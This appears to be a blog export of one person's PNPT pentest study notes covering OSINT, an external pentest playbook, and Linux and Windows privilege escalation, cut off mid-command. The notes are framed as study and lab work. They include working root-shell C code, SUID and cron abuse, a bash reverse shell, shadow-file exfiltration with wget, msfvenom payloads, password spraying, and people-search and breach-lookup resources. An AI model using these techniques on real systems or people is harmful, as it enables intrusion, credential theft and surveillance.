advanced search  - intext:&lt;term that shows inside a webpage&gt; - inurl:&lt;term that shows in url&gt; - intitle:&lt;term that show in title of articles&gt; - site:&lt;example.com&gt; - filetype:pdf, docx, xlxs, etc -  # &lt;exclude some term of the search&gt; + # &lt;add some term to the search&gt; “” # &lt;search specifics terms&gt;   Image OSINT   Reverse Image Searching   Google Image Search: https://images.google.com   Yandex: https://yandex.com   TinEye:  https://tineye.com   Viewing EXIF (exchangeable image file) Data  → http://exif.regex.info/exif.cgi   Physical Location OSINT  Look at satelites images, street view   On site reconassaince with drones   Geographical Locations  GeoGuessr: https://www.geoguessr.com   GeoGuessr: The Top Tips, Tricks and Techniques   → https://somerandomstuff1.wordpress.com/2019/02/08/geoguessr-the-top-tips-tricks-and-techniques/’   Email OSINT   Resources   Hunter.io: https://hunter.io/   Phonebook.cz; https://phonebook.cz/   VoilaNorbert: https://www.voilanorbert.com/   Email Hippo: https://tools.verifyemailaddress.io/   Email Checker:  https://email-checker.net/validate   Clearbit Connect: https://chrome.google.com/webstore/detail/clearbit-connect-supercha/pmnhcgfcafcnkbengdcanjablaabjplo?hl=en   Same lesson:   Reconnaissance from PEH   Password OSINT   Hunting Breached Password   Dehashed: https://dehashed.com/   WeLeakInfo: https://weleakinfo.to/v2/   LeakCheck: https://leakcheck.io/   SnusBase: https://snusbase.com/   Scylla.sh: https://scylla.sh/   HaveIBeenPwned: https://haveibeenpwned.com/   Hunting Usernames and Accounts   NameChk: https://namechk.com/   WhatsMyName: https://whatsmyname.app/   NameCheckup: https://namecheckup.com/   Search for People   WhitePages: https://www.whitepages.com/   TruePeopleSearch: https://www.truepeoplesearch.com/   FastPeopleSearch: https://www.fastpeoplesearch.com/   FastBackgroundCheck: https://www.fastbackgroundcheck.com/   WebMii: https://webmii.com/   PeekYou: https://peekyou.com/   411: https://www.411.com/   Spokeo: https://www.spokeo.com/   That’sThem: https://thatsthem.com/   Voter Records: https://www.voterrecords.com   Phone Numbers:   TrueCaller: https://www.truecaller.com/   CallerID Test: https://calleridtest.com/   Infobel: https://infobel.com/   Discovering Birthdates:   google = “name or username” intext:”happy birthday” site:twitter, face, linkedin etc   Searching Resumes:   google = “name” resume site: linkedin.com   Social Media OSINT   Twitter  \"\" = specific terms from:&lt;user&gt; to:&lt;user&gt; from:&lt;user&gt; since:&lt;year-month-day&gt; until:&lt;Y-M-D&gt; geocode:&lt;lat, lon, radius&gt; advanced search   Resources   Social Bearing - https://socialbearing.com/   Twitonomy - https://www.twitonomy.com/   Sleeping Time - http://sleepingtime.org/   Mentionmapp - https://mentionmapp.com/   Tweetbeaver - https://tweetbeaver.com/   Spoonbill.io - http://spoonbill.io/   Tinfoleak - https://tinfoleak.com/   TweetDeck - https://tweetdeck.com/   Facebook   Sowdust Github - https://sowdust.github.io/fb-search/   IntelligenceX Facebook Search - https://intelx.io/tools?tab=facebook   Instagram   Wopita - https://wopita.com/   Code of a Ninja - https://codeofaninja.com/tools/find-instagram-user-id/   InstaDP - https://www.instadp.com/   ImgInn - https://imginn.com/   Snapchat   Snapchat Maps - https://map.snapchat.com   Website OSINT   BuiltWith - https://builtwith.com/   Domain Dossier - https://centralops.net/co/   DNSlytics - https://dnslytics.com/reverse-ip   SpyOnWeb - https://spyonweb.com/   Virus Total - https://www.virustotal.com/   Visual Ping - https://visualping.io/   Back Link Watch - http://backlinkwatch.com/index.php   View DNS - https://viewdns.info/      Search for reverse ip lookup, whois, dns report, ip location finder, port scanner, etc    Subdomains   Pentest-Tools Subdomain Finder - https://pentest-tools.com/information-gathering/find-subdomains-of-domain#   Spyse - https://spyse.com/   crt.sh - https://crt.sh/   Extra   Shodan - https://shodan.io   city:&lt;x&gt; port:&lt;x&gt; org:&lt;organization&gt;   Wayback Machine - https://web.archive.org/   Hunting Businesses   Open Corporates - https://opencorporates.com/   AI HIT - https://www.aihitdata.com/   indeed - https://br.indeed.com/      Go to linkedin   search for:  information, location, etc employes badges   in google:   site:linkedin.com/in/ “* at company”   Wireless OSINT   WiGLE - https://wigle.net/   Lab building   VMWare Workstation Player - https://www.vmware.com/ca/products/workstation-player/workstation-player-evaluation.html   VirtualBox - https://www.virtualbox.org/wiki/Downloads   TraceLabs OSINT VM - https://www.tracelabs.org/initiatives/osint-vm   TraceLabs OSINT VM Installation Guide - https://download.tracelabs.org/Trace-Labs-OSINT-VM-Installation-Guide-v2.pdf   Working with Tools   Image and Location OSINT  apt install libimage-exiftool-perl   Emails and breachead Data  breach-parse - https://github.com/hmaverickadams/breach-parse   theHarvester -d tesla.com -b google -l 500  # -d = domain # -b - source # -l = length ./breach-parse.sh @tesla.com tesla.txt  h8mail -t shark@tesla.com -bc \"/opt/breach-parse/BreachCompilation/\" -sk   Username and Account OSINT  whatsmyname -u &lt;username&gt;  sherlock &lt;username&gt;   Phone Number OSINT  phoneinfoga scan -n 14082492815 phoneinfoga serve -p 8080   Social Media OSINT  pip3 install --upgrade -e git+https://github.com/twintproject/twint.git@origin/master#egg=twint pip3 install --upgrade aiohttp_socks      Twint - https://github.com/twintproject/twint   Twint:  -u = user -s = somethin the user specifically said --year --since \"Y-M-D hour:min:sec\" --folowers --following    Website OSINT      wappalyzer firefox extension   whatweb   whois &lt;domain&gt;  nano ~/.bashrc  export GOPATH=$HOME/go  export GOROOT=/usr/lib/go export PATH=$PATH:$GOROOT/bin:$GOPATH/bin  source ~/.bashrc      go get -u github.com/tomnomnom/httprobe   go get -u github.com/tomnomnom/assetfinder   GO111MODULE=on go get -u -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder   go get -u github.com/sensepost/gowitness   export GO111MODULE=on   go get -v github.com/OWASP/Amass/v3/…   subfinder -d &lt;domain&gt; assetfinder &lt;domain&gt; amass enum -d &lt;domain&gt; cat &lt;domain&gt;.txt | sort -u | httprobe -s -p https:443 gowitness file -f ./alive.txt -P ./pics --no-http   Subfinder - https://github.com/projectdiscovery/subfinder   Assetfinder - https://github.com/tomnomnom/assetfinder   httprobe - https://github.com/tomnomnom/httprobe   Amass - https://github.com/OWASP/Amass   GoWitness - https://github.com/sensepost/gowitness/wiki/Installation   Exploring OSINT Frameworks     FinalRecon   LittleBrother   Maltego   recon-ng   Marketplace search   marketplace install &lt;module&gt; modules load &lt;module&gt; info options set SOURCE &lt;domain&gt; run show hosts back   profiler module   - Sn0int - Spiderfoot - WikiLeaker   Extra tool   Hunchly - https://hunch.ly      its a chrome extension works like burp, you activate and then go to web to search pages while the hunchly get data that we want    photon -u &lt;domain&gt;   Automating Website OSINT    #!/bin/bash  domain=$1 RED=\"\\033[1;31m\" RESET=\"\\033[0m\"  info_path=$domain/info subdomain_path=$domain/subdomains screenshot_path=$domain/screenshots  if [ ! -d \"$domain\" ];then   mkdir $domain fi  if [ ! -d \"$info_path\" ];then   mkdir $info_path fi  if [ ! -d \"$subdomain_path\" ];then   mkdir $subdomain_path fi  if [ ! -d \"$screenshot_path\" ];then   mkdir $screenshot_path fi  echo -e \"${RED} [+] Checkin' who it is...${RESET}\" whois $1 &gt; $info_path/whois.txt  echo -e \"${RED} [+] Launching subfinder...${RESET}\" subfinder -d $domain &gt; $subdomain_path/found.txt  echo -e \"${RED} [+] Running assetfinder...${RESET}\" assetfinder $domain | grep $domain &gt;&gt; $subdomain_path/found.txt  #echo -e \"${RED} [+] Running Amass. This could take a while...${RESET}\" #amass enum -d $domain &gt;&gt; $subdomain_path/found.txt  echo -e \"${RED} [+] Checking what's alive...${RESET}\" cat $subdomain_path/found.txt | grep $domain | sort -u | httprobe -prefer-https | grep https | sed 's/https\\?:\\/\\///' | tee -a $subdomain_path/alive.txt  echo -e \"${RED} [+] Taking dem screenshotz...${RESET}\" gowitness file -f $subdomain_path/alive.txt -P $screenshot_path/ --no-http    Additional Resources   TraceLabs - https://www.tracelabs.org/   Innocent Lives Foundation - https://www.innocentlivesfoundation.org/   Alethe Denis - https://twitter.com/AletheDenis   Joe Gray - https://twitter.com/C_3PJoe   IntelTechniques - https://inteltechniques.com/   OSINT Flowcharts - https://inteltechniques.com/blog/2018/03/06/updated-osint-flowcharts/  ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","osint"],
        "url": "/notes/pnpt/osint/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser4.jpg"
      },{
        "title": "3 - External Pentest Playbook",
        "excerpt":"  Goal:   Test the security from an outside perspective   Provide quality of service to the client   Preparation   Checklist:  - Ensure ROE is signed by client - Add IPs in scope to Scope tab - Verify customer scope - Send kickoff email - Conduct vulnerability scanning with Nessus or other - Identify emails/users/pass in breach databases (dehashed, breach-parse, etc) - Identify employees &amp; email address format (linkedin, phonebook.cz, clearbit, etc) - Identify client's websites and search for any data useful to help attack (job posting, system information, password policy, etc) - Attempt to enumerate any accounts on portals, password reset function, etc - Run web app scans, if necessary - Conduct manual testing and exploitation on targets - Validate scanning tool vulnerabilities - Conduct password spraying guessing and brute force on login portals - Escalate access from external to internal - Validate previous year findings have been resolved - Cleanup   ROE - Rules of engagement:  - This document summarizes the rules of engagement for the cybersecurity assessment offered by &lt;company&gt;.  - The intent of this document is to clearly define the roles and responsabilities and the details of the test agreement. - if ROE its not signed, do not start the pentest!   Verifying Scope:  - bgp.he.net   Client Communication:  - if you find a critical vulnerability, tell your client because they need to patch immediately.   Attack strategy  - Think of external pentest like home security - Low change of RCE, high chance of weak passwords - OSINT is your best friend (and logical guessing)   Vulnerability Scanning   Nessus   Advanced Scan:  General Settings we can Schedule  Discovery:  - host: default - port: all ports 1-65535 - service: default  Assesment: - enable web application if necessary   Reviewing &amp; Extracting Information  Export the Nessus File Generate a Report (Executive Summary &amp; Custom) to PDF and HTML   Optional  www.melcara.com Nessus Parser: - pearl parse_nessus_xml.v24.pl -f &lt;nessus file&gt;   Information Gathering / OSINT   Hunting Breached Credentials   Run breach-parser:  get emails and password that have been breached before get the max information you can later we can password spray or credential spray to try to get access to something using the emails found earlier   Run Dehashed or others tools:  gather more information      Do not attack out of scope domains       but you can use the password breached from others domains and try to use in the scope domain       same with emails breached, we can rockyou or something similar like summer2021 etc    Identifying Employees and Emails  clearbit - browser extension hunter.io phonebook.cz -search for domains/emails Linkedin &gt; employees   Enumerating Valid Accounts  identify login portals - 'take note' go to login portal of the domain scope  try to reset an invalid login to show the error  try to reset or login with emails that you gathered and see if the error changes   Others useful information  Look at job posting, system information, password policy   Attacking Login Portals   By this point, you should have identified:  - Login portals to attack - List of possible employees/emails - Password strategies to employ   Password strategy  Could be:  - season + year + special character - past season + year + special character - month + year  - company name + number/year/something - city or address location - sports team of the city    Password Spraying Office365   Majority of clients uses microsoft, because AD   One spray pass Tool example  trevorspray.py -e &lt;list of emails&gt; -passwords 'winter20!' --delay 10 --no-current-ip --ssh user@ip -k &lt;key&gt;.pem (aws key pair)  # delay = time to try again # no-current-ip = not set our ip  # a couple of user@ip because will spray one at time # if the delay is 10sec and you have 10 accounts, after 100secs the spray will come back to the first, so its a good practice to not block the account.      Be aware of the lock out password policy   If you get lock account error, stop the spraying   If the lock out policy is lets say 5 tries, try 4 times then try another 4 an hour later   Sign in for AWS   Go to aws management console:  ec2 &gt; launch VM ubuntu &gt; free tier eligible launch instances grab the public IP and put in the script user@ip after spraying in the ip of the target   Password Spraying OWA (outlook web app)  metasploit &gt; search owa use auxiliary/scanner/http/owa_login set options   Attacking Other Portals  - With other type of portals we go to Burp - set scope &gt; options AND target scope  - intercept the request - send to intruder/repeater - intruder &gt; options &gt; grep - match &gt; add the login error - in options &gt; set the password as variable - sniper attack &gt; payloads &gt; add some common passwords (winter2021!, summer2021@ etc) - look at the length/status code/the grep match of the login error   If you wanna try credential stuffing:      this will try the first username with the first password, the second with the second etc    - set the username to variable as well - set the attack type to pitchfork - in payloads &gt; list &gt; add logins/usernames/login too   We can use the attack type cluster bomb:  This will try every username with every password - the pitchfork option is better to not lock out the account   Bypassing MFA (multi factor authentication)   MFASweep:  Invoke-MFASweep -Username &lt;user&gt; -Password &lt;pass&gt;   For example:  - We could ask the client, to create an account For us. - and then we try to log in only with the password, without the MFA. - If the company set the MFA correctly, this should not work.  Invoke-SelfSearch -Mailbox &lt;email&gt; -ExchHostname &lt;hostname&gt; -remote      Usually social engineering is out of scope, so this method is useful to test their MFA    Escalating Access -  Strategy   Here we have some sort of access and want to escalate   Look at azure portal, share point, vpns access, emails      Enumeration is they key   Report Writing   Examples:   https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report   https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf      If its a web pentest we should put : OWASP references If its a external: NIST reference    Common Pentest Findings   Insufficient Authentication Controls:  - client do not have MFA - in case you didn't find the MFA, you can ask the client - therefore you can recommend in the report anyways   Weak Password Policy:  - client need to understand that they need to improve de pass policy - again,  if you didn't find the pass policy, just ask the client - so you can help them improve that   Insufficient Patching:  - Provide the mitigation with there is no patch available for that vulnerability - even if you didnt explore in time, add in the report cause they need to mitigate - check the versions of services to find these kind of patching issues - nessus is great for that also   Default Credentials:  Check default credentials of every service: emails, printers, web servers, router, etc   Insufficient Encryption:  client uses HTTP: they should migrate to HTTPS and turnoff http web issues: SSL, TLS, SWEET32, RC4, Self-Signed Certificate mitigation: disable weak ciphers on public web services   Information Disclosure:  information leaked through errors mitigation: disable debug reporting / properly handle invalid users unnecessary information via mDNS on UDP port 5353 mitigation: filter incoming traffic to UDP port 5353 unnecessary information within http responde headers mitigation: remove unnecessary information from http headers verbose error messages 403 &amp; 404 mitigation: disable verbose error message in the server config   Username Enumeration:  Forgot password errors: synchronize valid/invalid account messages   Default Web Pages:  apache, IIS, etc - the attacker will inventory the software version for future attacks mitigation: replace the default pages with terms of service.   Open Mail Relays:  https://www.blackhillsinfosec.com/how-to-test-for-open-mail-relays/   IKE Aggressive Mode:  in aggressive mode enable we could capture the PSK (pre-shared key) of a VPN tool: ike-scan mitigation: synchronize error messages. error messages should be consistent with valid and invalid users the likelyhood of exploiting this is very low, close to zero. but is a common finding and potential risk.   Unexpected Perimeter Services:  rdp, telnet enable to the external network talk to the client, if thats is intentional    Insufficient Traffic Blocking:  tool: Shotsherpa block unnecessary traffics like others countries, if possible perhaps not blocking, but limiting traffic in certain way   Undetected Malicious Activity:  nmap scan, nessus scan, web enumeration brute force  make sure the client knows where they need to improve   Historical Account Compromises:  Accounts that have been breached before  Remediation: - Avoid password reuse between sites. - Train users to not use work emails for site registrations unless necessary. - enforcing password rotation with strict password complexity requirements. - its recommended ‘haveibeenpwned.com’ subscription for proactive alerting of compromised comporate accounts.   Wrapping Up   Client Debriefs  Explain the report Keep simple like you are explain to a non technical people Its normal not know something or question they ask Our job is to help find securities vulnerabilities before the attacker and help the company to solve those issues and improve their network \t - You need to be technical, explain things at high level - Able to write well - Sociable enough to debrief a report in front of people   Attestation Letters  After the pentest in finished, we send a letter to summarizes the activities performed   Retesting  We can offer the company 60~90 days of retesting, that means they have some time to fix the problems we found.  Then we go there and retest the vulnerabilities We do not take off the vulnerabilties found in the last pentest, we just add remetiate if the company fixed the issue.  ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","external"],
        "url": "/notes/pnpt/pentestexternal/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser3.jpg"
      },{
        "title": "4 - Linux Privilege Escalation",
        "excerpt":"  Resources:   TCM: https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources   Basic Linux Privilege Escalation:  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   Linux Privilege Escalation:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md   Checklist - Linux Privilege Escalation:  https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist   Sushant 747’s Guide (Country dependant - may need VPN):  https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html   Initial Enumeration   System Enumeration   → https://tryhackme.com/room/linuxprivescarena   uname -a cat /proc/version cat /etc/issue lscpu ps aux      In the initial enum we wanna know the kernel version, architecture and processes.    User Enumeration  whoami id sudo -l = to show what sudo permission we have cat /etc/passwd | cut -d : -f 1 = to show only the users cat /etc/shadow cat /etc/group history      Here we wanna know who we are, what access do we have    Network Enumeration  ifconfig or ip a route or ip r arp -a or ip neigh netstat -ano      What ports are open, what communication exists in the network, which network do we have access    Password Hunting  grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2&gt;/dev/null locate password or pass or pwd | more find / -name authorized_keys or id_rsa 2&gt;/dev/null      look for password and sensitive files    Exploring Automated Tools   Testing Tools   LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS   LinEnum: https://github.com/rebootuser/LinEnum   Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester   Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker   Escalation Path: Kernel Exploits   Kernel escalation   Kernel Exploits: https://github.com/lucyoa/kernel-exploits   We can get version with:  uname -a   Go to google &gt; exploitdb or searchsploit   Permissions   Stored Passwords  history hunt down with linpeas, linenum   Weak File Premissions     Can we access something we should not?   Can we modify something?   Do we have access to /etc/shadow?  copy /etc/passwd and /etc/shadow and use 'unshadow &lt;passFile shadowFile&gt;' in kali crack with hashcat -m 1800 or john   SSH Keys  find / -name authorized_keys 2&gt;/dev/null find / -name id_rsa 2&gt;/dev/null   we can ssh-keygen and add the public key to the target machine:   Or copy the id_rsa file from target and use:  &lt;ssh -i file user@ip&gt;   Escalation Path: Sudo   Allow system administrator to delegate authority to run programs   Shell Escaping   GTFOBins: https://gtfobins.github.io/  after sudo -l = to show files we can run with root privileges go to GTFOBins to search the files we can execute   Intended Functionality   There is no apache2 in gtfobins, but we can use this functionality to show shadow files:  sudo apache2 -f /etc/shadow   wget example: https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/   In target:  \tsudo wget --post-file=/etc/shadow &lt;kali ip:port&gt; = We will send the shadow file to our PC, just listen with netcat to grab the file   In kali:  nc -lvnp &lt;port&gt;   LD_PRELOAD  nano shell.c   #include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt;  void _init() {   unsetenv(\"LD_PRELOAD\");   setgid(0);   setuid(0);   system(\"/bin/bash\"); }  gcc -fPIC -shared -o shell.so shell.c -nostartfiles sudo LD_PRELOAD=/fullpath/shell.so &lt;something we can run as root&gt;    Sudo CVEs   CVE-2019-14287   → https://www.exploit-db.com/exploits/47502   sudo -l  user ALL=(ALL, !root) /bin/bash = user cannot execute /bin/bash  sudo -u#-1 /bin/bash whoami root   CVE-2019-18634   → https://github.com/saleemrashid/sudo-cve-2019-18634   cat /etc/sudoers sudo -l sudo -V      In older machines, if pwfeedback is enable = asterisc appers when you type passwords we can use an exploit to escalate that    Escalation Path: SUID (set user ID)   Search for suid files  find / -perm -u=s -type f 2&gt;/dev/null      If we have an upload file directory, but it does not accept php files we can send to burp and fuzz the extension, to find an alternative, like php3,php4, phtml, etc       Go to gtfobins if u find a file with SUID access    Advanced SUID   via Shared Object Injection  find / -perm -4000 -type f  -ls 2&gt;/dev/null  strace &lt;file&gt; 2&gt;&amp;1 | grep -i -E \"open|access|somethin else\" = trace executable file / the grep just filters      if u find a file in crontab or whatever that the system is executing as root, you can create a malicious file with the same name as that file, to make the system execute this instead;    nano malicious.c (btw nano &gt; VIM )  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;  static void inject() __attribute__((constructor));  void inject() {   system(\"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p\"); }  gcc -shared -fPIC -o &lt;path/output file&gt; &lt;path of file&gt;    via Binary Symlinks   Nginx Exploit: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html      For this to work, we need find the SUID bit set in /usr/bin/sudo file. and vulnerable version of nginx    via Environmental Variables  env  # to show environmental variables  find / -perm -4000 -type f  -ls 2&gt;/dev/null   File running with root privileges:  service apache2 start  # this is vulnerable cause is running without the full path for service      Lets remember that the system grabs the full path of service via env $PATH       With that in mind, we can make a malicious file and alter the $PATH variable to run a script.    echo 'int main () { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;} &gt; /tmp/service.c'  gcc /tmp/service.c -o /tmp/service/ export PATH=/tmp:$PATH   File running with root but with full path:  /usr/sbin/service apache2 start  function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; } export -f /usr/sbin/service  # -f = refers to shell functions   Escalation Path: Capabilities   Resources  Linux Privilege Escalation using Capabilities: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/   SUID vs Capabilities: https://mn3m.info/posts/suid-vs-capabilities/   Linux Capabilities Privilege Escalation: https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099   Hunting for Capabilities  Its similar to SUID, we can run files with privileges:  getcap -r / 2&gt;/dev/null # /usr/bin/python2.6 = cap_setuid+ep  /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'   Escalation Path: Scheduled Tasks   Look for Cron  There is others ways to visualize this, if u dont have permission to run crontab, seach for an alternative example:  /etc/init.d | /etc/cron* | /etc/sudoers | ls -al /etc/ | grep cron   cat /etc/crontab   Look for Systemd Timers:  systemctl list-timers --all   Escalation via Cron Paths   If the crontab is executing a file, go to your $PATH variable  to see which path u have access.  in case u have access in any dir, lets go make something malicious to trick the crontab, to run our file   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh chmod +x /home/user/overwrite.sh      wait the crontab to execute our file    we can ls the /tmp where the copy of the bash is located, when the suid bit is set, we are good to go  /tmp/bash -p   Cron Wildcards  cat /etc/crontab   Lets say there is a file running in crontab, doing tar backup in a directory with (*) = that means all files inside that directory  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; runme.sh chmod +s runme.sh touch /home/user/--checkpoint=1 touch /home/user/--checkpoint-action=exec=sh\\runme.sh # wait crontab to execute /tmp/bash -p   Cron File Overwrites   If we have privileges to write a file thats running by root in crontab, we just echo something malicious and wait  cat /etc/crontab  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /file/overwrite.sh # wait crontab /tmp/bash -p    tips      If you are not finding directories, perhaps u should look for subdomains    wfuzz -c -f sub-fighter -w &lt;wordlist&gt; -u &lt;url&gt; -H \"Host: FUZZ.target.com\" --hw 290 (exclude 290 errors)   crontab backing up a file with wildcard (*) again:  echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; file.sh chmod +x file.sh   Escalation Path: NFS Root Squashing   Identification of the vulnerability  cat /etc/exports # output example=/tmp *(rw,sync,insecure,\"no_root_squash\",no_subtree_check)      It means that the /tmp folder is shareable and can be mounted and everything inside the mount gonna be run by root, so we can take advantage of that.    Execution   From kali:  showmount -e &lt;target ip&gt;  mkdir /tmp/mountme mount -o rw,vers=2 &lt;target ip&gt;:/tmp /tmp/mountme      Now we put something malicious in the mounted folder    echo 'int main() {setgid(0); setuid(0); system(\"/bin/bash\"); return 0; }' &gt; /tmp/mountme/malicious.c  gcc /tmp/mountme/malicious.c -o /tmp/mountme/shell chmod +s /tmp/mountme/shell   From the target machine:  cd /tmp ./shell root   Escalation Path: Docker   Overview  run linpeas or linenum    Execution  gtfobins again: https://gtfobins.github.io/gtfobins/docker/   docker run -v /:/mnt --rm -it alpine(or bash) chroot /mnt sh   CTFs  - Lazy Admin - Anonymous - Tomghost - ConvertMyVideo - pspy - BrainPan1 - bfo      ConvertMyVideo   ${IFS} = using as space  bash -i &gt;&amp; /dev/tcp/10.17.27.169/7778 0&gt;&amp;1      Found a file running by root with pspy64   we could add a reverse shell and wait the connection      the others I’ve done before.. so i’ll just follow the videos    Buffer Overflow 101 for brainPan1 CTF  - first FUZZ to find when the application gonna crash - then: msf-pattern_create -l &lt;number of crash&gt; - paste to the script - copy the EIP value - msf-pattern_offset -l &lt;number of crash&gt; -q &lt;EIP number&gt; - grab the offset value - we can send the buffer “A”*&lt;offset value&gt; + “B”*4  = the EIP should be 42424242 - grab badchars chars - add to your script and u should follow the ESP dump to find the badchars - or &gt; Using Mona # check how to use Mona from PEH here  # https://MashrurRahmanRawnok.github.io/notes/pnpt/peh/#exploit-development-using-python3-and-mona) - take off the badchars of the script - u should find the pointer with no protections - invert the pointer - generate msfvenom with the inverted pointer, open a listener to receive connection - exploit!  ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","linux","privesc"],
        "url": "/notes/pnpt/linuxprivesc/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser6.jpg"
      },{
        "title": "5 - Windows Privilege Escalation",
        "excerpt":"  Resources:   THM :https://tryhackme.com/room/windowsprivescarena   Git: https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources   Fuzzy Security Guide:  https://www.fuzzysecurity.com/tutorials/16.html   PayloadsAllTheThings Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md   Absolomb Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/   Sushant 747’s Guide (Country dependant - may need VPN): https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html   Initial Enumeration   System Enumeration  getuid sysinfo   in Windows:  systeminfo | findstr /B /C: \"OS Name\" /C: \"OS Version\" /C:\"System Type\"  # wmic ( windows manager instrumentation command line )  # qfe ( quick fix engineering )  # to see whats patched  wmic qfe get Caption,Description,HotFixID,InstalledOn wmic logicaldisk get caption,description,providername   User Enumeration   in Windows:  whoami whoami /priv whoami /groups net user net user &lt;specific user&gt; net localgroup &lt;group&gt;   Network Enumeration  ipconfig /all arp -a route print netstat -ano   Password Enumeration  findstr /si password *.txt *.ini *.config &lt;looks at the current directory&gt; findstr /spin \"password\" *.* %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\ /s /b | findstr /si *vnc.ini   AV Enumeration   Service controller:  sc query windefend sc queryex type= service   Firewall:  netsh advfirewall firewall dump netsh firewall show state netsh firewall show config   Automated Tools   WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS   Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation   Sherlock - https://github.com/rasta-mouse/Sherlock   Watson - https://github.com/rasta-mouse/Watson   PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc   JAWS - https://github.com/411Hall/JAWS   Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester   Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/   Seatbelt - https://github.com/GhostPack/Seatbelt   SharpUp - https://github.com/GhostPack/SharpUp   Tools for enumeration   Executables:  winpeas.exe Seatbelt.exe (compile) Watson.exe (compile) SharpUp.exe (compile)   PowerShell:  Sherlock.ps1 PowerUp.ps1 jaws-enum.ps1   Other:  windows-exploit-suggester.py (local) exploit suggester (metasploit)   Executing   in Metasploit:  cd c:\\\\windows\\\\temp upload &lt;path/winpeas.exe&gt; load powershell run post/multi/recon/local_exploit_suggester   in shell:  powershell -ep bypass powerup.ps1      if powershell and winpeas are not avaiable to use    in Kali:  # https://github.com/AonCyberLabs/Windows-Exploit-Suggester ./windows-exploit-suggester.py --update pip install xlrd --upgrade  # 'if u dont have pip' &gt; curl http://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py ./windows-exploit-suggester.py --database &lt;db.xls&gt; --systeminfo &lt;sysinfo file&gt;   Escalation Path: Kernel Exploits   Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits   Kernel     Is a computer program that controls everything in the system   Facilitates interactions between hardware and software components   A translator   In metasploit  after run suggester / winpeas / powerup, we have an idea which kernel exploits we can try background the session so we search in metasploit example: exploit/windows/local/ms10_015_kitrap0d set options &gt; run   Manually  msfvenom -p windows/shell_reverse_tcp lhost=&lt;kali ip&gt; lport=&lt;port&gt; -f aspx &gt; shell.aspx nc -lvnp &lt;port&gt; = set a listener\t  # MS10-059 Exploit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059      transfer the exploit to the windows target machine    in kali:  python3 -m http.server 80    in windows:  cd c:\\Windows\\Temp certutil -urlcache -f http://&lt;kali ip&gt;/&lt;file&gt; &lt;output name&gt; exploit.exe &lt;kali ip&gt; &lt;port&gt;   in kali:  nc -lvnp &lt;port&gt;      run &amp; get root access    Escalation Path: Passwords and Port Forwarding   chatterbox - hack-the-box  Achat Exploit - https://www.exploit-db.com/exploits/36025   Achat Exploit (Metasploit) - https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof   We can modify the payload to shell_reverse_tcp and add lhost, lport and set new target ip   Fire the msfvenom again after the modifications and change the payload:  - open a listener = netcat - run the exploit   Enum  systeminfo net users net user &lt;user&gt; ipconfig netstat -ano   Hunting passwords  reg query HKLM /f password /t REG_SZ /s   If a password shows here, we can copy the register path of the file to show more info:  ref query &lt;reg path of the pwd found&gt;      Got username and a password    Here we need to think the available options:  - is ssh open? - is smb available? so we can use psexec attack? - perhaps password reuse?   Port Forwarding  Plink Download - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html   Download plink with the same version of your target   Send the file to the target:  # open a python server # receive the file  certutil -urlcache -f http://&lt;kali ip&gt;/&lt;file&gt; &lt;output name&gt;   - modify the /etc/sshd_config - set PermitRootLogin yes - service ssh restart - service ssh start   in Target:  plink.exe -l &lt;kali 